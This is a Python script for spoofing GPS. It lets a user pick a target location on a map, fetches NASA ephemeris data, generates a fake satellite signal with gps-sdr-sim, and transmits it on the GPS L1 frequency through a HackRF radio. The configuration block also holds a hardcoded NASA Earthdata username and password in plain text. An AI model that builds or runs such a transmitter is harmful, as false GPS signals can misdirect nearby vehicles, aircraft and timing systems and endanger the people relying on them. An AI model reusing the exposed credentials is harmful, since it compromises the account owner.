import os
import datetime
import subprocess
import requests
import gzip
import shutil
import tkinter
import sys
from tkintermapview import TkinterMapView

# --- CONFIGURATION ---
NASA_USER = "kab00038"
NASA_PASS = "gb83VfWJu7%*^9PTrs2@"
HACKRF_BIN = "hackrf_transfer"
GPS_SIM_BIN = "./gps-sdr-sim"
WORKING_DIRECTORY = os.path.dirname(os.path.abspath(__file__))

# Global to store coordinates
selected_coords = [None, None]
root = None

def remove_duplicate_files(string):
    """Removes any file in the current directory containing the given string."""
    try:
        for file in os.listdir('.'):
            if string in file:
                os.remove(file)
                print(f"[!] Cleaned up: {file}")
    except Exception as e:
        print(f"[!] Cleanup error: {e}")

def get_gps_date_info():
    """Returns UTC yesterday's date info for NASA's daily broadcast files."""
    now = datetime.datetime.utcnow() - datetime.timedelta(days=1)
    return now.strftime("%Y"), now.strftime("%y"), now.strftime("%j")

def open_map():
    """Opens the GUI for location selection."""
    root = tkinter.Tk()
    root.geometry("800x600")
    root.title("GPS Spoof Location Picker")

    def on_closing():
        root.quit()
    
    root.protocol("WM_DELETE_WINDOW", on_closing)

    map_widget = TkinterMapView(root, width=800, height=550, corner_radius=0)
    map_widget.pack()
    map_widget.set_position(40.7128, -74.0060) # Default NYC
    map_widget.set_zoom(10)

    label = tkinter.Label(root, text="Left-click to drop a pin, then click Confirm")
    label.pack()

    def add_marker(coords):
        global selected_coords
        map_widget.delete_all_marker()
        map_widget.set_marker(coords[0], coords[1], text="Spoof Target")
        selected_coords = [coords[0], coords[1]]
        label.config(text=f"Selected: {coords[0]:.5f}, {coords[1]:.5f}")

    def confirm():
        if selected_coords[0] is not None:
            # Hiding the window keeps the Tcl interpreter alive 
            # while stopping the user interaction.
            root.withdraw() 
            root.quit() 
        else:
            label.config(text="! PLEASE SELECT A LOCATION FIRST !", fg="red")

    map_widget.add_left_click_map_command(add_marker)
    btn = tkinter.Button(root, text="CONFIRM & GENERATE", command=confirm, bg="green", fg="white")
    btn.pack()
    
    root.mainloop() # Execution stops here until root.quit() is called

def download_ephemeris(year, yy, doy):
    filename = f"brdc{doy}0.{yy}n.gz"
    url = f"https://cddis.nasa.gov/archive/gnss/data/daily/{year}/brdc/{filename}"

    remove_duplicate_files("brdc")

    print(f"[*] Downloading {filename} from cddis.nasa.gov...")
    with requests.Session() as session:
        session.auth = (NASA_USER, NASA_PASS)
        response = session.get(url, allow_redirects=True)
        
        # NASA's Earthdata redirect logic
        if response.history:
            response = session.get(response.url)

        if response.status_code == 200 and not response.text.startswith("<!DOCTYPE"):
            with open(filename, "wb") as f:
                f.write(response.content)
            
            unzipped = filename.replace(".gz", "")
            with gzip.open(filename, 'rb') as f_in, open(unzipped, 'wb') as f_out:
                shutil.copyfileobj(f_in, f_out)
            
            os.remove(filename)
            print(f"[+] Successfully prepared {unzipped}")
            return unzipped
        else:
            print(f"[!] NASA Download failed. HTTP {response.status_code}")
            return None
    
def run_sim(ephem_file, lat, lon, alt):
    remove_duplicate_files("gpssim.bin")
    print(f"[*] Generating GPS signal file for {lat}, {lon}...")
    cmd = [
        GPS_SIM_BIN,
        "-e", ephem_file,
        "-l", f"{lat},{lon},{alt}",
        "-b", "8",
        "-d", "100"
    ]
    subprocess.run(cmd)

def transmit():
    # Fix: Added () to .lower() and added a small flush for cleaner terminal input
    sys.stdout.flush()
    choice = input("\n[?] Generation complete. Start transmitting? (y/n): ")
    if choice.lower() == 'y':
        power = input("Enter transmit power (0-47) [Default 0]: ").strip() or "0"
        print(f"[!] TRANSMITTING at power {power}... Press CTRL+C to stop.")
        
        cmd = [
            HACKRF_BIN,
            "-t", "gpssim.bin", 
            "-f", "1575420000",
            "-s", "2600000",
            "-a", "1",
            "-x", power
        ]
        try:
            subprocess.run(cmd)
        except KeyboardInterrupt:
            print("\n[*] Transmission stopped.")

if __name__ == "__main__":
    # Ensure we are in the right folder
    if not os.path.exists(WORKING_DIRECTORY):
        print(f"[!] Directory {WORKING_DIRECTORY} not found!")
    else:
        os.chdir(WORKING_DIRECTORY)
        open_map()
        
        if selected_coords[0]:
            y, yy, d = get_gps_date_info()
            ephem = download_ephemeris(y, yy, d)

            if ephem:
                run_sim(ephem, selected_coords[0], selected_coords[1], 100)
                transmit()
    try:
        if root:
            root.destroy()
    except:
        pass